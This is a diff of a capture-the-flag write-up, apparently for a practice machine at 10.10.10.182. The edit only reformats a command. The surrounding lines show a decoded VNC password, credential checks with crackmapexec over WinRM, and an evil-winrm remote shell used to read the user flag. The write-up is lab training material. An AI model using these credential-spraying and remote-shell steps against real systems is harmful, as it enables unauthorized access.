@@ -170,7 +170,7 @@ First I tried to decrypt it with hex but it didn’t seem to work, I then found ou
 I found a way to decrypt it using [GitHub](https://github.com/frizb/PasswordDecrypts) </br>
 I used this command: ```echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass``` </br>
 Decrypted password: sT333ve2 </br> </br>
-Tried using winrm this time: crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2 </br>
+Tried using winrm this time: ```crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2``` </br>
 And it worked: </br>
 I used evil-winrm and got a shell: ```evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182``` </br>
 cd ```C:\Users\s.smith\desktop``` -> type ```user.txt``` -> Got the user flag. </br>
